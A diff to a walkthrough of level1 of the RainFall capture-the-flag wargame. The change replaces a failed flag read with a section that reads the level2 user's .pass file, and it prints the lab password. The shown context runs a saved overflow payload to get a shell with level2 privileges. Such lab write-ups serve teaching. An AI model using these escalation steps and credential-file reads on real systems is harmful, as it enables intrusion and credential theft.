@@ -106,13 +106,22 @@ We save the result to the file `/tmp/payload`.
 
 We use the `cat` command with the `-` option to keep STDIN open, since the shell executed by the `run` function needs an
 interactive terminal to work properly. Once we run our exploit successfully, we can use the `id` command to verify that
-the shell is running as the `level2` user. However, there is no flag file.
+the shell is running as the `level2` user. 
 
 ```shell
 level1@RainFall:~$ cat /tmp/payload - | ./level1
 Good... Wait what?
 id
 uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
-cat /home/user/level2/flag
-cat: /home/user/level2/flag: No such file or directory
 ```
+
+## Getting the Password
+
+Finally, we can read the `.pass` file of `level2` to complete the level.
+
+```shell
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+We can now log in via SSH as the `level2` user using the password we just found.
